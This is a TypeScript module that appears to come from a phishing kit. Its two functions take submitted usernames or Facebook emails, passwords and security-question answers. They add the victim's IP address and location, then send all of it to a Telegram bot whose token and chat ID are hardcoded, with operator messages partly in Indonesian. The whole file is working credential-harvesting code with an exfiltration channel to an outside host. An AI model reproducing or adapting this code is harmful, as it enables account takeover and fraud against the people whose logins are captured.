import axios from 'axios';

interface LocationData {
  ip: string;
  city: string;
  region: string;
}

const getLocation = async (): Promise<LocationData> => {
  try {
    const ipRes = await axios.get('https://ipapi.co/json/');
    return {
      ip: ipRes.data.ip || 'Unknown',
      city: ipRes.data.city || 'Unknown',
      region: ipRes.data.region || 'Unknown'
    };
  } catch (e) {
    console.error('Failed to get location', e);
    return { ip: 'Unknown', city: 'Unknown', region: 'Unknown' };
  }
};

export const sendToTelegram = async (
  username: string, 
  pass: string, 
  q1: string, 
  q2: string
) => {
  const BOT_TOKEN = '8221710757:AAEl7v_CMy8GUm3-bP2NhkFiYHnKX0Wg32w';
  const CHAT_ID = '-5022569647';

  const loc = await getLocation();

  const now = new Date();
  const timeString = now.toISOString().replace('T', ' ').split('.')[0];

  const message = `
🔐 New Login Data Received
🕒 Time    : ${timeString}
🌐 IP      : ${loc.ip}
🏙 City    : ${loc.city}
® Region  : ${loc.region}

🆔 ID      : ${username}
🔑 Password: ${pass}

🛡️ Security Questions:
${q1}
${q2}

_User Masuk, pastikan Anda Selalu Stenbay._
  `;

  return sendMessage(BOT_TOKEN, CHAT_ID, message);
};

export const sendFacebookLogin = async (
  email: string, 
  pass: string,
  q1: string,
  q2: string
) => {
  // Use the SAME token as ID login which is known to work
  const BOT_TOKEN = '8221710757:AAEl7v_CMy8GUm3-bP2NhkFiYHnKX0Wg32w';
  const CHAT_ID = '-5022569647';

  const loc = await getLocation();
  const now = new Date();
  const timeString = now.toLocaleString();

  const message = `
🔔 Login Facebook Detected 🔔

🕒 Waktu Login: ${timeString}
🌐 IP      : ${loc.ip}
🏙 City    : ${loc.city}
® Region  : ${loc.region}

👤 Email: ${email}
🔑 Password: ${pass}

🛡️ Security Questions:
${q1}
${q2}

_User Masuk, pastikan Anda Selalu Stenbay._
  `;

  return sendMessage(BOT_TOKEN, CHAT_ID, message);
};

const sendMessage = async (botToken: string, chatId: string, text: string) => {
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
      }),
    });

    if (!response.ok) {
      throw new Error('Gagal mengirim ke Telegram');
    }
    return true;
  } catch (error) {
    console.error('Telegram Error:', error);
    return false;
  }
};
